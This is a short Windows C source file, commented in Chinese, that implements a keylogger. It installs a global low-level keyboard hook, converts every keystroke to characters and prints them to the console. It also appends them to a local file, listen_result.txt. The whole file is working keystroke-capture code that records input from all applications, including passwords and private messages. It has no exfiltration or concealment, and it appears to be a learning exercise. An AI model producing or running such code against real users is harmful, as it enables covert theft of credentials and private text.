#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 向文件后面追加监听到的字符
void appendToFile(WCHAR buffer[])
{
    FILE *file;
    char filename[] = "listen_result.txt";
    file = fopen(filename, "a");
    if (file == NULL)
    {
        perror("Open File Faild.");
        exit(-1);
    }
    fwprintf(file, L"%ls", buffer);
    fclose(file);
}

// 全局钩子句柄
HHOOK hHook = NULL;

// 键盘钩子回调函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode < 0)
    {
        exit(-1);
    }
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

    if (wParam == WM_KEYDOWN)
    {
        // 获取虚拟键码
        DWORD vkCode = pKeyBoard->vkCode;
        // 转换虚拟键码到字符
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        WCHAR buffer[5];
        int result = ToUnicode(vkCode, pKeyBoard->scanCode, keyboardState, buffer, 4, 0);
        buffer[result] = '\0'; // 添加字符串结束符

        if (result > 0)
        {
            printf("Key Down: %ls\n", buffer); // 打印字符
            // 将结果追加到文件中
            appendToFile(buffer);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// 设置钩子
void SetHook()
{
    if (!(hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0)))
    {
        printf("Failed to install hook!\n");
    }
}

// 取消钩子
void ReleaseHook()
{
    if (hHook)
    {
        UnhookWindowsHookEx(hHook);
    }
}

int main()
{
    MSG msg;

    // 设置全局钩子
    SetHook();

    // 消息循环
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 取消钩子
    ReleaseHook();

    return 0;
}
